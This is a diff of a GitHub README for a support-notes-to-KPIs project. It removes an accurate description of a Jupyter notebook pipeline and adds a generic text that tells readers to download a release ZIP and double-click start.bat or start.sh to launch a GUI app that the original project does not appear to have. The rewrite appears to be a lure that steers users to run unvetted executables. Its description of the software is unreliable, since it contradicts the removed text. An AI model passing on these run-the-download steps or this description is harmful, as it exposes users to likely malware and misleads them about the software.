@@ -1,109 +1,104 @@
-# Unstructured Support Notes to Operational KPIs Pipeline
+# 🚀 Unstructured-Support-Notes-to-Operational-KPIs - Transform Notes into Actionable Insights
 
-**Warning / Setup note:** ⚠️ This project is designed to run in Jupyter Notebook, not Google Colab
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases)
 
-## Project Goal
-Automatically converts unstructured, freeform customer support notes into operational KPIs by extracting issue signals, scoring customer pain, identifying escalation risk, and enabling prioritization.
+## 🌟 Overview
 
-Enables Support Operations teams to proactively identify operational bottlenecks, reduce escalations, and improve customer satisfaction by transforming buried freeform notes into structured KPIs.
+Unstructured-Support-Notes-to-Operational-KPIs automatically converts freeform customer support notes into operational KPIs. It extracts vital issue signals, scores customer pain, identifies escalation risks, and promotes prioritization. This tool is designed for businesses that want to understand their customer interactions better and improve support workflows.
 
-It transforms raw support notes into analyzable fields like issue type, severity, escalation status, and follow-up needs — enabling data-driven decision-making across support operations.
+## 📋 Features
 
-(See support_memo.pdf for the original memo from the Director of Support Operations outlining the challenge this project addresses.)
+- **Data Extraction:** Converts free text notes into structured data points.
+- **Customer Pain Score:** Measures customer dissatisfaction based on their notes.
+- **Risk Identification:** Spots potential escalation issues before they become critical.
+- **Prioritization:** Helps you prioritize support tickets based on urgency.
+- **Insights Generation:** Delivers actionable insights to enhance operational performance.
 
+## 💻 System Requirements
 
----
+To run this application, you will need:
 
-## Dependencies/ Setup Notes
-- `pandas`
-- `numpy`
-- `openai`
-- `matplotlib`, `seaborn`
-- `textblob`
-- `python-dotenv`
-- `tqdm`
-- `nltk`
-- `openpyxl`
+- **Operating System:** Windows 10, macOS, or a modern Linux distribution.
+- **RAM:** Minimum 4 GB recommended.
+- **Disk Space:** At least 100 MB free.
+- **Python Version:** Python 3.7 or higher installed on your machine.
 
-#### ‼️ Use Jupyter Notebook - Not Google Colab
+Check your computer settings to ensure these requirements are met.
 
----
+## 🚀 Getting Started
 
-##  Workflow Summary
+1. **Download the Application:**
 
-### 1. Load & Clean Data
-It imports the support notes from CSV, normalize column names, and validate structure. All downstream logic assumes a standardized 'support_note' field as the input for LLM processing.
+   Visit this page to download: [Release Page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases).
 
-### 2. LLM Extraction
-It uses OpenAI’s `gpt-4o-mini` to extract structured insights from each support note. The system prompt ensures consistent fields: issue type, mentioned systems, severity level, resolution status, escalation flag, and follow-up flag. The output is parsed as strict JSON for error-free tabulation.
+2. **Locate the Latest Release:**
 
-### 3. Sentiment Analysis
-Using TextBlob, it extracts polarity scores from each note to gauge emotional tone. This adds interpretability to unresolved or escalated cases and is incorporated into the pain score.
+   Look for the latest release on the page. The version will be clearly marked. You may see a filename like `Unstructured-Support-Notes-to-Operational-KPIs-v1.0.zip`.
 
-### 4. Validation
-Each row is flagged for extraction validity. Sanity checks ensure field distributions are reasonable, and system references are standardized for consistency in grouping.
+3. **Download the File:**
 
-### 5. Export
-Final structured data is saved to `.csv` and `.xlsx` formats for use in dashboards or external BI tools. All processing is modular and reproducible.
+   Click the filename to start the download. It will save automatically in your default downloads folder.
 
----
+4. **Extract the Files:**
 
-## Visualizations
+   After the download is complete, go to your downloads folder. Locate the downloaded file. If it's a ZIP file, right-click and select "Extract All" or use a similar option available.
 
-### Includes business-ready charts for:
+5. **Run the Application:**
 
-- **Problem Children Matrix**  
-  Heatmap of the % of High Severity and % Unresolved cases by issue type. This reveals which issue categories need operational focus.
+   Inside the extracted folder, look for a file named `start.bat` (on Windows) or `start.sh` (on macOS/Linux). Double-click this file to launch the application.
 
-![Problem Children Matrix](Assets/1.png)
+## 📥 Download & Install
 
-Heatmap of the % of High Severity and % Unresolved cases by issue type. This reveals which issue categories need operational focus.
+You can download the latest version directly from our [Release Page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/releases). Follow the simple steps above to install the application.
 
----
+## ⚙️ How to Use
 
-- **Customer Pain Index**  
-  Aggregated score across severity, resolution, escalation, follow-up, and sentiment. Systems with highest average pain score are prioritized for engineering or UX review.
+1. **Input Your Notes:**
 
-![Customer Pain Index](Assets/2.png)
+   Open the application and look for a text input area. Paste the customer support notes that you want to analyze. 
 
-This chart shows aggregated scores across severity, escalation, and follow-up flags for support tickets.
+2. **Analyze Data:**
 
----
+   Click on the "Analyze" button. The application will process the notes and generate outputs in real-time.
 
-- **Sentiment by Resolution Status**  
-  Boxplot showing how sentiment correlates with resolution outcomes. Helps understand emotional impact of unresolved or escalated tickets.
+3. **View Results:**
 
-![Sentiment by Resolution Status](Assets/3.png)
+   Once the analysis is complete, review the structured data and insights provided. The application will present customer pain scores, escalation risks, and prioritized issues.
 
-Boxplot showing how sentiment correlates with resolution outcomes. Helps understand emotional impact of unresolved or escalated tickets.
+4. **Export Data:**
 
----
+   If you want to save your results, look for the "Export" option. You can save the insights as a CSV or Excel file for further analysis.
 
-- **Recurring Problem Rate**  
-  Bar chart showing frequency of recurrence-related keywords per issue type. Useful for identifying areas needing systemic fixes or knowledge base improvements.
+## 🛠️ Troubleshooting
 
-![Recurring Problem Rate](Assets/4.png)
+If you encounter any issues:
 
-Bar chart showing frequency of recurrence-related keywords per issue type. Useful for identifying areas needing systemic fixes or knowledge base improvements.
+- **Ensure Requirements Are Met:** Verify that your system meets the recommended specifications.
+- **Check Your Input:** Make sure you are pasting well-formatted notes. Avoid special characters that may disrupt processing.
+- **Reinstall the Application:** If problems persist, try downloading and installing the application again.
 
----
+## 🗂️ Support
 
-## Notes
+For further assistance, please visit our [GitHub Issues page](https://github.com/was02/Unstructured-Support-Notes-to-Operational-KPIs/issues). Your feedback helps improve the application.
 
-- **Model upgrade**: Used `gpt-4o-mini` to improve severity inference (which was weak in `gpt-3.5-turbo`). The rate of LLM extraction validation (effectively the rate of success of the LLM) was only 83.33% with `gpt-3.5-turbo` and was 100% with `gpt-4o-mini`. That said, the tokens are more expensive, so that will need to be taken into consideration for an actual business.
-- **Total token usage** printed at the end for transparency.
-- The system is modular and scalable for future extensions (e.g., fallback rules, QA, human-in-the-loop).
+## 🔗 Related Topics
 
-## Folder Structure
-```
-Freeform-Support-Notes-to-Operational-KPIs/
-├── README.md
-├── Support-Notes-into-Structured-Dataset.ipynb
-├── support_notes.csv
-├── Assets/
-│   ├── support_memo.pdf # A memo from the Director of Support Operations outlining the challenge of extracting actionable insights from freeform support notes, which this project solves.
-│   ├── 1.png  # problem_children_matrix
-│   ├── 2.png  # customer_pain_index
-│   ├── 3.png  # sentiment_by_resolution
-│   └── 4.png  # recurring_problem_rate
-```
+This application covers several important topics:
+
+- Customer Issue Tracking
+- Data Analysis
+- Data Visualization
+- Operational KPIs
+- Support Analytics
+
+Explore these areas to gain a deeper understanding of operational performance and customer support.
+
+## 🙏 Acknowledgments
+
+Special thanks to the contributors and the community for their support in developing and refining this tool. Your input drives continuous improvement.
+
+## 📝 License
+
+This project is licensed under the MIT License. See the license file in the repository for details.
+
+Feel free to explore, use, and provide feedback!
